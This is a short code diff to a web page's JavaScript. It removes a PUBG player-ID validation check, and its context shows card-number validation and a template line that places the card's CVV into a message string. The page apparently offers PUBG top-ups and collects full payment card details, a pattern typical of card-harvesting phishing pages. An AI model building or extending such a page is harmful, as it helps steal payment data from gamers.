@@ -1588,11 +1588,6 @@
                 second: '2-digit'
             });
             
-            // Validate PUBG ID
-            if (!pubgId || pubgId.length < 10) {
-                alert('يرجى إدخال معرف PUBG صحيح (10 أرقام على الأقل)');
-                return;
-            }
             
             // Validate card number
             if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
@@ -1844,4 +1839,5 @@ CVV: ${cardCvv}
         });
     </script>
 </body>
+
 </html>
